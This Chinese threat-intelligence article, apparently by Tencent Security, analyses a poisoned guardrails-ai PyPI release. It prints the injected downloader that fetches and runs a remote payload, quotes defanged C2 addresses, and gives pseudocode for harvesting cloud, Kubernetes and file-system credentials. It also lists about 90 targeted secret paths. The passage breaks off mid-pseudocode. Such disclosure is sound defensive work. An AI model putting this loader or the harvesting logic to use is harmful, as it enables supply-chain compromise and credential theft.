---
title: 链锁裂变｜TeamPCP 供应链攻击劫持 guardrails-ai，七模块凭据收割全景分析
url: https://mp.weixin.qq.com/s/P4LnwNy2wVbLDEk12-3XIw
source: Doonsec's feed
date: 2026-05-12
fetch_date: 2026-05-13T05:44:20.404961
---

# 链锁裂变｜TeamPCP 供应链攻击劫持 guardrails-ai，七模块凭据收割全景分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jHUbrwW0VwWSZbOzFqfPJTI0agSQzI3VZibnw7er6pgREJCYseibd8b4ib7UOwTpeGUbHZKXCZjF70JRdNo6AWw4jSTa5IQ9V3b90NZiaD8UG3w/0?wx_fmt=jpeg)

# 链锁裂变｜TeamPCP 供应链攻击劫持 guardrails-ai，七模块凭据收割全景分析

原创

腾讯安全威胁情报
腾讯安全威胁情报

腾讯安全威胁情报中心

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> 2026 年 5 月 12 日凌晨，腾讯安全威胁情报中心捕获到知名 LLM 防护框架 `guardrails-ai` 的一个异常版本更新。经深度分析，确认为活跃供应链攻击组织 **TeamPCP** 发起的最新一轮投毒行动。攻击者在合法包入口文件末尾追加 14 行代码，静默下载并执行一枚 23KB 的 Python zipapp 载荷。载荷内含 **7 个并发凭据收割模块**，覆盖 AWS / Azure / GCP / Kubernetes / HashiCorp Vault / 密码管理器及 90 个敏感文件路径，同时具备条件性系统擦除与 systemd 持久化能力。本文沿攻击链逐层剖析其技术细节。

---

## 一、概述

`guardrails-ai` 是一个拥有 **6.8k GitHub Stars**、**600+ Forks** 的知名开源项目（Apache-2.0），月 PyPI 下载量约 25 万次，日均下载约 1.2 万次（pypistats.org 数据）。该库为 LLM 应用提供输入/输出验证框架，能够检测幻觉、策略违规和数据泄漏，是当前 AI 应用生产部署中最常用的防护组件之一。官方安装指令为 `pip install guardrails-ai`。

**使用范围**，guardrails-ai 广泛应用于企业级 LLM 应用的生产环境，典型场景包括：

* LLM 输入/输出结构化验证（结合 Pydantic schema）
* AI Agent 的安全策略执行（毒性检测、竞品信息过滤、PII 脱敏等）
* LLM 网关层防护（通过 Guardrails Server 部署为独立服务）
* 多模型统一接口（兼容 OpenAI、Anthropic 及开源模型）

用户群体涵盖 AI 应用开发者、MLOps 工程师、LLM 平台运维团队，部署环境多为 Linux 服务器、Kubernetes 集群和 CI/CD 流水线——恰好是本次恶意载荷的重点攻击目标。

**影响范围**，2026-05-12 00:47 UTC，攻击者向 PyPI 发布版本 **0.10.1**——紧随正式 release v0.10.0（2026-04-03）之后的递增版本号。包内 178 个 .py 文件中，**仅 `__init__.py` 末尾被追加了 14 行恶意代码**，其余 177 个文件均为原始合法代码。以下场景可能受影响：

* 使用 `pip install --upgrade guardrails-ai` 或不锁版本号的 CI/CD pipeline，可能静默拉取到恶意版本
* 恶意版本上传（00:47 UTC）至 PyPI 下架之间的窗口期内，所有新安装或升级操作均存在风险
* 依赖 guardrails-ai 的下游包和内部项目可能通过依赖传递被间接影响
* 恶意载荷仅在 Linux 平台触发，Windows/macOS 用户不受影响

PyPI 在数小时内下架了该包全部版本。我们通过 CDN 预取机制成功找回样本。

载荷署名 ASCII art 为 `TeamPCP`，C2 IP 与已知 TeamPCP 基础设施同网段，多项 TTP 高度吻合——这是该组织继 Trivy、KICS、LiteLLM、Telnyx、Xinference、TanStack 之后的**又一次高价值目标供应链投毒**。

---

## 二、初始入口：14 行的入口劫持

**注入位置**，`guardrails/__init__.py`，第 35-48 行。

原文件第 1-33 行为标准的模块导出代码（`from guardrails.guard import Guard` 等），攻击者在其后追加：

python

```
if sys.platform.startswith("linux"):

URL = "hxxps[:]//git-tanstack[.]com/transformers.pyz"

PATH = "/tmp/transformers.pyz"

req = urllib.request.Request(URL, headers={'User-Agent': 'Mozilla/5.0'})

with urllib.request.urlopen(req) as response, open(PATH, 'wb') as out_file:

out_file.write(response.read())

subprocess.run(["python3", PATH])
```

行为极为直白，无混淆：

```
import guardrails（任何方式）

↓

检查 sys.platform == "linux"

↓

从 git-tanstack[.]com 下载 transformers.pyz → /tmp/

↓ (User-Agent 伪造为 Mozilla/5.0)

subprocess.run(["python3", "/tmp/transformers.pyz"])
```

C2 域名 `git-tanstack[.]com` 仿冒了 TanStack 开源项目——就在**前一天**（2026-05-11），TeamPCP 刚刚对 TanStack 的 42 个 npm 包发动了大规模供应链攻击（CVE-2026-45321）。文件名 `transformers.pyz` 则仿冒 HuggingFace 的 Transformers 库。

对包内全部 178 个 .py 文件排查确认，恶意注入点唯一。

---

## 三、反沙箱三重门：`.pyz` 入口逻辑

第二阶段载荷 `transformers.pyz` 是一枚 23KB 的 Python zipapp 归档（SHA256: `0f35abda...`），解压后含 18 个文件、16 个 Python 模块。

`__main__.py` 实现了三重环境检查，逐层过滤非目标环境：

| 关卡 | 代码 | 意图 |
| --- | --- | --- |
| **① 平台检查** | `if sys.platform not in ('linux'): sys.exit(1)` | 仅攻击 Linux |
| **② 语言豁免** | `if lang.lower().startswith('ru'): sys.exit(1)` | 跳过俄语系统 |
| **③ 沙箱规避** | `if os.cpu_count() <= 4: sys.exit(1)` | 排除低配分析沙箱 |

通过检查后，静默安装 `cryptography` 库（`pip install cryptography --break-system-packages`），然后将 stdout/stderr 重定向到 `/dev/null`，运行主控模块 `entrypoint`。

---

## 四、主控中枢：三重冗余回传 + RSA 信封加密

`entrypoint.py` 是整个载荷的指挥中心（161 行），硬编码了 C2 地址和 RSA-4096 公钥。

### 4.1 C2 通信：伪装 ML 模型服务

python

```
_EARLY_QUARANTINE_URL = "hxxps[:]//83[.]142.209.194/v1/modelsx"

_TARGET_URL = "hxxps[:]//83[.]142.209.194/v1/weights"
```

C2 端点刻意伪装为机器学习模型服务 API 路径（`/v1/models`、`/v1/weights`），IP `83[.]142.209.194` 位于乌克兰基辅（Ghosty Networks LLC, AS205759）——与 Unit 42 已确认的 TeamPCP IoC `83[.]142.209.203` **位于同一 /24 网段**。

### 4.2 数据加密：RSA + AES 信封封装

窃取数据先经 gzip 压缩，再用随机 AES-256-GCM 密钥加密，AES 密钥本身用硬编码的 RSA-4096 公钥进行 OAEP-SHA256 封装。**只有持有对应私钥的攻击者才能解密**，即使截获流量也无法还原内容。

```
collect_all() → JSON → gzip → AES-256-GCM(随机密钥) → 密文

↓

RSA-OAEP-SHA256(公钥) → 加密的AES密钥

↓

POST → {"envelope": base64(iv+密文+tag), "key": base64(加密密钥)}
```

### 4.3 三重冗余回传机制

```
① 首选: POST → hxxps[:]//83[.]142.209.194/v1/weights

↓ 失败

② Dead Drop: GitHub Commit Search "FIRESCALE"

→ RSA 签名验证 → 解析备用 C2 URL

↓ 失败

③ 终极: 从窃取数据中提取 GitHub Token

→ 用受害者的 token 创建公开仓库

→ 仓库名: {斯拉夫民间传说词}-{词}-{数字}

→ 上传 results.json（全部窃取数据）
```

第三重回传尤为巧妙：利用受害者自己的 GitHub PAT 在其账户下创建公开仓库存放赃物。仓库名从 30 个斯拉夫民间传说词汇中随机组合（BABA-YAGA、KOSCHEI、FIREBIRD、RUSALKA 等），仓库描述固定为 `"PUSH UR T3MPRR"`。

---

## 五、七模块并发收割：从云密钥到密码管理器

`aggregate.py` 使用 `ThreadPoolExecutor` 并发调度 `collectors/` 下的全部 7 个收割模块，最大化窃取效率。

### 5.1 AWS：19 区域 × 15 线程全量扫描

`collectors/aws.py`（165 行）实现了完整的 AWS 凭据窃取链：

```
凭据获取（三路径）:

├─ 环境变量: AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY

├─ EC2 IMDS v2: 169[.]254.169.254 元数据服务

└─ ~/.aws/credentials 全 profile 遍历

窃取内容:

├─ Secrets Manager: ListSecrets → GetSecretValue（明文）

└─ SSM Parameter Store: DescribeParameters → GetParameter(WithDecryption=True)
```

覆盖 us-east-1/2、us-west-1/2、eu-west-1/2/3 等 **19 个区域**，以 **15 线程并发**扫描。认证使用自实现的 AWS SigV4 签名算法。

### 5.2 Azure：全订阅 Key Vault 遍历

`collectors/azure.py`（231 行）支持四种凭据获取路径——环境变量 Client Credentials、Client Certificate（自签 JWT）、Azure CLI 缓存（`~/.azure/accessTokens.json`）、Azure IMDS。获取 ARM + Vault 双 token 后，遍历所有 Subscription → 所有 Key Vault → 所有 Secret 的明文值。

python

```
# 伪代码 — azure.py 核心逻辑

resolve_tokens()  # 4种路径获取 arm_token + vault_token

for sub_id in list_subscriptions(arm_token):

for vault in list_vaults(arm_token, sub_id):

for secret_name in list_secret_names(vault_url, vault_token):

steal(get_secret_value(vault_url, secret_name, vault_token))
```

### 5.3 GCP：JWT 签名认证 + Secret Manager

`collectors/gcp.py`（186 行）对 Service Account 实现了**完整的 JWT-RS256 签名认证**（自行构造 JWT 并用 SA 私钥签名），支持 ADC 文件和 GCE IMDS。遍历项目内所有 Secret 的 latest 版本明文。

python

```
# 伪代码 — gcp.py 核心逻辑

def get_token(sa_json):

jwt = sign_rs256(header={"alg":"RS256"}, payload={

"iss": sa["client_email"],

"scope": "https://www.googleapis.com/auth/cloud-platform"

}, key=sa["private_key"])

return POST("https://oauth2.googleapis.com/token", assertion=jwt)

token = resolve_credentials()  # 3种路径: env SA文件 / ADC / GCE IMDS

for secret in list_secrets(token, project_id):

steal(get_secret_value(token, secret, version="latest"))
```

### 5.4 Kubernetes：自动下载 kubectl + 全集群 Secrets

`collectors/kubernetes.py` 是最大的模块（364 行），有一个值得关注的特性——**若目标机器无 kubectl，会自动从 `dl.k8s.io` 下载到 `/tmp/kubectl`**。随后遍历所有 context × 所有 namespace × 所有 Secrets，自动 base64 解码 Secret data。同时实现了纯 Python 的 K8s API 调用路径（使用 `os.memfd_create` 处理客户端证书认证）作为 fallback。

python

```
# 伪代码 — kubernetes.py 核心逻辑

if not which("kubectl"):

curl("https://dl.k8s.io/release/v1.28.0/bin/linux/{arch}/kubectl", "/tmp/kubectl")

chmod("/tmp/kubectl", 755)

for context in all_kubeconfig_contexts():

for namespace in list_namespaces(context):

for secret in list_secrets(namespace):

steal(base64_decode(secret.data))
```

### 5.5 文件系统：90 个敏感路径 + 全量环境变量

`collectors/filesystem.py`（373 行）硬编码了 **90 个敏感文件路径**，涵盖：

| 类别 | 典型路径 |
| --- | --- |
| 云凭据 | `~/.aws/credentials` , `~/.azure/accessTokens.json`, `~/.config/gcloud/application_default_credentials.json` |
| SSH/GPG | `~/.ssh/*` （遍历全目录）, `~/.gnupg/` |
| 包管理器 | `~/.npmrc` , `~/.pypirc`, `~/.cargo/credentials` |
| IaC | `~/.terraform.d/credentials.tfrc.json` , `*.tfstate`（递归搜索） |
| VPN | Tailscale state, WireGuard conf, `wg showconf all` |
| Docker | `~/.docker/config.json` + 所有容器环境变量（通过 Docker socket 或 CLI） |
| **AI 工具** ★ | `~/.config/claude/claude_desktop_config.json` , `~/.cursor/mcp.json`, `~/.vscode/mcp.json`, `~/.codeium/mcp.json`, `~/.continue/config.json`, `~/.zed/settings.json` |
| Shell 历史 | `~/.bash_history` , `~/.zsh_history` |

此外还递归搜索 HOME 下的所有 `.env` / `.env.*` 文件、所有 `*.tfstate` 文件，dump 完整的 `os.environ`，以及通过 `gh auth token` 和 `gh auth status --show-token` 主动获取 GitHub CLI 的认证令牌。

python

```
# 伪代码 — filesystem.py 核心逻辑

steal(read_all(90个硬编码敏感路径))

steal(list_and_read("~/.ssh/*"))

steal(os.environ)                                    # 全量环境变量

steal(recursive_find("~", ".env*"))                  # 递归搜索 .env 文件

st...